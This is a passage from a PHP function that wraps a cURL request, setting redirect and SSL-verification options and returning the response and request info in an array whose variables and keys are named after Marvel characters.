        curl_setopt($IRON_MAN,  CURLOPT_FOLLOWLOCATION, $CHAVEZ);
    }
    if (isset($JANET) && !empty($JANET)) {
        curl_setopt($IRON_MAN,  CURLOPT_SSL_VERIFYPEER, $JANET);
    }
    if (isset($HANK) && !empty($HANK)) {
        curl_setopt($IRON_MAN,  CURLOPT_SSL_VERIFYHOST, $HANK);
    }
    $LOKI = curl_exec($IRON_MAN);
    $CASSIE =  curl_getinfo($IRON_MAN);
    @curl_close($IRON_MAN);
    return array(
        "JITENDRAUNATTI" =>
        array(
            "data" => $LOKI,
            "info" => $CASSIE,
            "THOR" => "JANE_FOSTER",
            "LOKI" => "SYLVIE",
            "DOCTOR_STRANGE" => "CHRISTINE",
            "Date" => $ROCKET_RACCOON,
        )
    );
}
